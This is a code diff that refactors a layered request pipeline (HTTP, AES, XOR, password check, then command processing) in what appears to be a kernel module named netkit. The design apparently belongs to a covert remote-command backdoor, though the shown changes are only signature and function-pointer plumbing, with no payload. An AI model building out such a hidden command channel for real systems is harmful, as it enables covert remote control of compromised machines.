@@ -8,32 +8,26 @@
 #include "../sys/mem.h"
 #include "../cmd/iface.h"
 
-static inline int call_next_layer(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen, size_t index);
+typedef int (*pipeline_func_t)(void *pipeline_funcs, size_t index, const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen);
+
+static inline int call_next_layer(pipeline_func_t *pipeline_funcs, size_t index, const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen);
 
 #include "xor/xor.h"
 #include "aes/aes.h"
 #include "http/http.h"
 #include "auth_password/auth_password.h"
 
-static inline int pipeline_final_process(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen, size_t index)
+static inline int pipeline_final_process(pipeline_func_t *pipeline_funcs, size_t index, const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
 {
     return cmd_process(req_buf, req_buflen, res_buf, res_buflen);
 }
 
-static int (*PIPELINE_FUNCTIONS[])(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen, size_t index) = {
-    layer_http_process,
-    layer_aes_process,
-    layer_xor_process,
-    layer_auth_password_process,
-    pipeline_final_process
-};
-
-static inline int _do_call_next_layer(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen, size_t index)
+static inline int _do_call_next_layer(pipeline_func_t *pipeline_funcs, size_t index, const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
 {
-    return PIPELINE_FUNCTIONS[index](req_buf, req_buflen, res_buf, res_buflen, index);
+    return pipeline_funcs[index](pipeline_funcs, index, req_buf, req_buflen, res_buf, res_buflen);
 }
 
-static inline int call_next_layer(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen, size_t index)
+static inline int call_next_layer(pipeline_func_t *pipeline_funcs, size_t index, const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
 {
     int retv;
 
@@ -45,13 +39,13 @@ static inline int call_next_layer(const u8 *req_buf, size_t req_buflen, u8 **res
     if (IS_ERR(sym_name))
         return PTR_ERR(sym_name);
 
-    retv = sprint_symbol(sym_name, (unsigned long)PIPELINE_FUNCTIONS[index]);
+    retv = sprint_symbol(sym_name, (unsigned long)pipeline_funcs[index]);
     if (retv < 0)
         return retv;
 
     NETKIT_LOG("[*] calling '%s' (req_buflen: %lu)\n", sym_name, req_buflen);
 #endif
-    retv = _do_call_next_layer(req_buf, req_buflen, res_buf, res_buflen, index);
+    retv = _do_call_next_layer(pipeline_funcs, index, req_buf, req_buflen, res_buf, res_buflen);
 #if CONFIG_NETKIT_DEBUG
     NETKIT_LOG("[%c] returned '%s' (res_buflen: %lu, retv: %d)\n", retv >= 0 ? '+' : '!', sym_name, *res_buflen, retv);
 
@@ -61,10 +55,12 @@ static inline int call_next_layer(const u8 *req_buf, size_t req_buflen, u8 **res
     return retv;
 }
 
-static inline int pipeline_process(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
+static inline int pipeline_process(pipeline_func_t *pipeline_funcs, const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
 {
     // this only returns an error when the first pipeline layer is returning an error
-    return call_next_layer(req_buf, req_buflen, res_buf, res_buflen, 0);
+    // we need to redo all registers here since we  insert the index param at call_next_layer
+    // - this is worth it for clarity
+    return call_next_layer(pipeline_funcs, 0, req_buf, req_buflen, res_buf, res_buflen);
 }
 
 
